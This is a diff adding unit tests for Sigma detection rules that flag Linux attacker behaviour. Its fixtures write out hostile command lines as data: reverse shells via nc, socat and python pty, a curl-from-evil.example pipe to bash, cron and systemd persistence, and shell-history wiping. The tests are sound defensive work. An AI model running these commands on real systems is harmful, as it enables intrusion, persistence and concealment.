@@ -286,6 +286,79 @@ class SigmaDetectionTests(unittest.TestCase):
                           "LOOKALIKE domain (faketransfer.sh, not transfer.sh) "
                           "should not match")
 
+    def test_reverse_shell_interpreter_nc_python_socat_branches_fire_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises
+        # selection_bash_dev_tcp — the other three OR-branches (nc -e,
+        # python pty.spawn, socat EXEC:) never fire in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_reverse_shell_interpreter.yml")["detection"]
+        nc_exec = {"Image": "/usr/bin/nc", "CommandLine": "nc -e /bin/sh 10.0.0.5 4444"}
+        self.assertTrue(detection_matches(det, nc_exec),
+                         "reverse-shell rule regressed: nc -e branch no longer fires")
+        python_pty = {"Image": "/usr/bin/python3", "CommandLine": "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"}
+        self.assertTrue(detection_matches(det, python_pty),
+                         "reverse-shell rule regressed: python pty.spawn branch no longer fires")
+        socat_exec = {"Image": "/usr/bin/socat", "CommandLine": "socat TCP:10.0.0.5:4444 EXEC:/bin/sh"}
+        self.assertTrue(detection_matches(det, socat_exec),
+                         "reverse-shell rule regressed: socat EXEC: branch no longer fires")
+        # nc without -e, and socat without EXEC:, must NOT fire (companion
+        # flag/token required, not the bare binary alone).
+        nc_no_exec = {"Image": "/usr/bin/nc", "CommandLine": "nc -l -p 4444"}
+        self.assertFalse(detection_matches(det, nc_no_exec),
+                          "reverse-shell rule over-fired: nc without -e should not match")
+
+    def test_ingress_tool_transfer_pipe_to_shell_branch_fires_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises
+        # selection_temp_dest — the pipe-to-shell branch never fires in
+        # any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_ingress_tool_transfer.yml")["detection"]
+        pipe_to_bash = {"Image": "/usr/bin/curl", "CommandLine": "curl http://evil.example/x.sh | bash"}
+        self.assertTrue(detection_matches(det, pipe_to_bash),
+                         "ingress-tool-transfer rule regressed: pipe-to-shell branch no longer fires")
+
+    def test_cron_at_persistence_cron_dir_and_at_branches_fire_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises the
+        # crontab branch — the cron-directory-write and `at` branches
+        # never fire in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_cron_at_persistence.yml")["detection"]
+        cron_dir_write = {"Image": "/bin/bash", "CommandLine": "echo '* * * * * curl evil|sh' > /etc/cron.d/evil"}
+        self.assertTrue(detection_matches(det, cron_dir_write),
+                         "cron/at-persistence rule regressed: cron-directory write branch no longer fires")
+        at_job = {"Image": "/usr/bin/at", "CommandLine": "at now + 1 minute"}
+        self.assertTrue(detection_matches(det, at_job),
+                         "cron/at-persistence rule regressed: at branch no longer fires")
+        # A read-only listing of the cron directory (no write verb) must
+        # NOT fire the cron-directory branch.
+        cron_dir_read = {"Image": "/bin/ls", "CommandLine": "ls /etc/cron.d/"}
+        self.assertFalse(detection_matches(det, cron_dir_read),
+                          "cron/at-persistence rule over-fired: a read-only cron.d listing "
+                          "with no write verb should not match")
+
+    def test_shell_history_tamper_unset_symlink_truncate_branches_fire_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises
+        # selection_history_c — the other three OR-branches (unset
+        # HISTFILE, symlink to /dev/null, truncate) never fire in any
+        # fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_shell_history_tamper.yml")["detection"]
+        unset_histfile = {"Image": "/bin/bash", "CommandLine": "unset HISTFILE"}
+        self.assertTrue(detection_matches(det, unset_histfile),
+                         "shell-history-tamper rule regressed: unset HISTFILE branch no longer fires")
+        symlink_devnull = {"Image": "/bin/ln", "CommandLine": "ln -sf /dev/null ~/.bash_history"}
+        self.assertTrue(detection_matches(det, symlink_devnull),
+                         "shell-history-tamper rule regressed: symlink-to-/dev/null branch no longer fires")
+        truncate = {"Image": "/bin/bash", "CommandLine": "cat /dev/null > ~/.bash_history"}
+        self.assertTrue(detection_matches(det, truncate),
+                         "shell-history-tamper rule regressed: truncate branch no longer fires")
+
+    def test_systemd_service_persistence_unit_write_branch_fires_independently(self):
+        # #441 Part A: fixtures.json's true_positive only exercises the
+        # systemctl-enable branch — the unit-file-write branch never
+        # fires in any fixture.
+        det = load_rule(SIGMA_DIR / "proc_creation_lnx_systemd_service_persistence.yml")["detection"]
+        unit_write = {"Image": "/bin/bash",
+                      "CommandLine": "bash -c 'cat > /etc/systemd/system/evil.service <<EOF\\n[Service]\\nEOF'"}
+        self.assertTrue(detection_matches(det, unit_write),
+                         "systemd-service-persistence rule regressed: unit-file-write branch no longer fires")
+
     def test_lazagne_survives_rename_off_lazagne_path(self):
         # M13 US2 (#232) security review: the fixtures.json true_positive for
         # this rule has "lazagne" in its own filename, so it alone cannot prove
